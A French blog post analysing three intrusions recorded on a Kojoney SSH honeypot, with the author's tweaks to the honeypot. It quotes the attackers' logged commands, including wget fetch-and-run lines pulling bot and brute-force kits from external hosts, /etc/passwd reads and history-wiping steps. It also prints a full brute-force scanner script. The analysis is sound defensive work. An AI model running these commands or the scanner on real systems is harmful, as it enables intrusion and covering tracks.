---
title: "Dernières visites sur le honeypot SSH"
tags: [honeypot]
---

Je vous fais part des dernières visites que j'ai eu sur mon honeypot [Kojoney](http://kojoney.sourceforge.net/) dont je vous avais parlé [ici]({% link _posts/2011-01-06-Revue-du-honeypot-Kojoney.md %}) et dont la dernière intrusion intéressante remonte à [ce billet]({% link _posts/2011-01-08-Intrusion-du-24-novembre-2006.md %}).  

Ici pas d'intrus très imaginatifs mais c'est l'occasion d'écrire quelque chose.  

## Premier cas  

Un brute force est effectué depuis une adresse IP située en Russie. [Le FAI](http://www.comcor.ru/ru/) a son siège social à Moscou.  

L'attaquant est venu depuis une adresse IP roumaine depuis le FAI [RDS](http://rdsnet.ro/solutii/solutii.htm).  

Les commandes lancées sont très certainement l'œuvre d'un bot :  

```bash
uname -a
uptime
/sbin/ifconfig | grep inet
cd /var/tmp; wget http://adriana.marte.ro/luci.tgz; tar xzvf luci.tgz; rm -rf luci.tgz; cd .luci; ./crond
```

La sortie de quelques commandes systèmes est récupérée (certainement enregistrée sur la machine qui a lancé le brute force). Ça leur permet de connaître la version du kernel, l'ip de la machine ainsi que son uptime (ils aiment bien ça)  

Une archive tgz est ensuite récupérée à l'aide de `wget`. Le fichier désarchivé donne un répertoire caché (`.luci`) dans lequel on trouve un [EnergyMech](http://fr.wikipedia.org/wiki/EnergyMech) compilé sous le nom `crond` ainsi qu'un [pico](http://fr.wikipedia.org/wiki/Pico_(logiciel)) (un éditeur de texte qu'on retrouve souvent dans ces *"kits"*... ils ne sont même pas capables d'utiliser `Vim`).  

L'adresse du site sur laquelle a été pris l'archive nous confirme la nationalité du pirate.  

Le bot IRC est configuré pour se connecter sur un serveur du réseau [UnderNet](http://fr.wikipedia.org/wiki/Undernet) sur un chan baptisé `#LUCIsiCUTIT`  

Une fois le bot lancé, le pirate n'a plus qu'à se connecter au chan pour lui donner des ordres. Bien sûr, comme *Kojoney* n'est qu'une simulation de shell, les commandes n'ont pas vraiment été exécutées.  

## Second cas  

L'attaque brute force provient d'une machine polonaise dont le FAI est [la version polonaise de FT/Orange](http://www.tp.pl/prt/).  

L'intrus se connectera depuis une machine roumaine chez [ARtelecom](http://www.clicknet.ro/).  

Un premier passage très rapide est fait pas le pirate :  

```bash
w
cat /proc/cpuinfo
```

Afficher les infos sur le CPU est une autre action qui revient souvent... mais je doute qu'ls s'en servent pour savoir s'ils sont sur un honeypot.  

```bash
passwd
cd /var/tmp
cd /tmp
ls -a
mkdir ." '^?"
cd ." '^?"
wget www.eraserulhk.evonet.ro/arhive/james.tgz
curl -O www.eraserulhk.evonet.ro/arhive/james.tgz
ftp
wget
su root
```

Un bon nombre de commandes n'aboutit pas, ce qui explique qu'ils ont tendance à s'acharner.  

Après une nouvelle déconnexion (toujours très courtes... c'est probablement parce que le terminal bugue) il revient avec les commandes suivantes :  

```bash
passwd
passwd
pwd
ls -a
wget valoare.xhost.ro/unixcod.tgz;tar zxvf unixcod.tgz;rm -rf unixcod.tgz;cd unixcod;chmod +x *;mv unix bash
curl -O  valoare.xhost.ro/unixcod.tgz
ftp
```

La première archive (`james.tgz`) génère un dossier caché nommé `...`  

On y trouve un _EnergyMech_ (encore) compilé pour différentes plates-formes avec un nom différent à chaque fois : darwin (Mac PPC), httpd (FreeBSD), linux (Linux ELF x86)  
Le bot cherche à se connecter sur le chan `#HackerTeam` sur un serveur *UnderNet*. On trouve aussi l'adresse d'un site Internet (en .ro) qui est celui du pirate... Rien d'intéressant à y voir.  

La seconde archive `unixcod.tgz` est un kit d'exploitation ssh. On y trouve :  

- Une liste de paires login/password (fichier `data.conf`)  

- Un script baptisé `unix` dont le contenu est le suivant :  

```bash
#!/bin/bash
if [ $# != 1 ]; then
        echo "[+] Folosim : $0 [b class]"
        exit;
fi

echo "[+][+][+][+][+] UnixCoD Atack Scanner [+][+][+][+][+]"
echo "[+]   SSH Brute force scanner : user & password   [+]""
echo "[+]        Undernet Channel : #UnixCoD            [+]"
echo "[+][+][+][+][+][+][+] ver 0x10  [+][+][+][+][+][+][+]"
./find $1 22

sleep 10
cat $1.find.22 |sort |uniq > ip.conf
oopsnr2=`grep -c . ip.conf`
echo "[+] Incepe partea cea mai misto :D"
echo "[+] Doar  $oopsnr2 de servere. Exista un inceput pt. toate !"
echo "[=][=][=][=][=][=][=][=][=][=][=][=][=][=][=][=][=][=][=][=][=]"
echo "[+] Incepem sa vedem cate server putem sparge"
./atack 100
rm -rf $1.find.22 ip.conf
echo "[+] UnixCoD Scanner a terminat de scanat !"
```

- Un script d'automatisation pour générer des ips et lancer un binaire (qui n'est pas présent dans l'archive ou a été renommé)  

Viennent ensuite les deux binaires appelés dans le script `unix` :  

- `find` : un scanneur de ports qui sera lancé pour chercher les machines avec un port 22 ouvert. L'exécutable n'est pas strippé. Une analyse du binaire nous apprend que le développeur n'a pas utilisé `select()` et fait appel à la fonction `time()` pour vérifier l'état de ses sockets.  

Même si le code n'a rien de particulier j'ai décidé de l'analyser histoire de passer le temps et d'apprendre à mieux me servir de [HT](http://hte.sourceforge.net/)  

- `atack` : le brute forcer. Il récupére les ips dans `ip.conf`, les login/pass dans `data.conf` et stocke les résultats dans un fichier `vuln.txt`  

![Unixcod](/assets/img/unixcod.jpg)  

À noter qu'aucune backdoor n'est présente dans cette archive (il faut croire qu'il ne comptait pas revenir)  

## Troisième cas  

Les scans pour la journée sont parvenus de Costa Rica ([l'ISP du pays](http://www.ice.go.cr/) gère aussi l'électricité et les télécoms) puis du Mexique  

L'attaquant semblait venir du Pérou (FAI : [telefonica.com.pe](http://www.telefonica.com.pe/))  

Commandes exécutées :  

```bash
uname -a
ps x
ps
bash
ls -a
cd ..
cd
ls -a
cd tmp
cat /etc/passwd
```

Reconnexion du visiteur  

```bash
cd videos
cat /etc/issue
ps
ps x
cd /var/tmp
help
adduser oscar
passwd
passwd
uname -a
boot
ls -a
ls
ps
ls -a
ps aux
mkdir ocm
cd ocm
ls -a
bash
wget freewebs.com/h0zk4r/udp.zip
```

Ensuite, il a dû faire appel à un copain portugais (IP différente) qui a lancé les commandes suivantes :  

```bash
unset HISTFILE HISTLOG HISTSAVE SCREEN
w
uname -a
who
wget
id
sh
history -c
exit
```

Le fichier zip contient un script de flood UDP en perl. J'ai des doutes sur son efficacité mais je n'ai pas fait de tests non plus.  

## Modifications  

Les attaquants écourtent leurs visites à la vue des limitations du système simulé. Premièrement les visiteurs qui utilisent ce type d'attaques bruyantes n'ont généralement qu'une connaissance limité de Linux et en dehors de quelques commandes toutes faites ils ne savent pas quoi tapper pour avoir les réponses aux questions qu'ils se posent. De plus ils ne semblent pas se douter qu'ils sont sur un honeypot et ne vont pas essayer de le vérifier (pourtant il existe des méthodes permettant par exemple de savoir si on est sur un système émulé).  

Le problème principal de *Kojoney* est l'absence d'un système de fichier virtuel. Un `ls` donnera toujours le même résultat même si l'intrus lance un `cd`, un `touch`, un `mkdir`, etc.  

De plus pour la plupart des commandes *Kojoney* répondra par un *"command not found"* ou un *"permission denied"*.  

J'ai récemment apporté des changements à ma version de *Kojoney* afin que plus de commandes soient possibles. Par exemple le fait que les commandes internes à bash ne soit pas présentes risquait de donner de forts soupçons au visiteur.  
J'ai aussi trouvé le moyen d'obtenir le nom du login pour la session en cours afin d'offrir une invite de commande personalisée du type `login@hostname $`  
Des réponses toutes faites ont été ajoutées pour certaines commandes (`cat /proc/cpuinfo` par exemple) pour donner plus de réalisme.  

Évidemment ce n'est pas parfait mais avec ces nouvelles modifications je pense bien doubler le temps de présence de mes visiteurs.  

[Télécharger mes modifications au format .tar.bz2](/assets/data/kojoney.tar.bz2)

*Published January 08 2011 at 15:39*
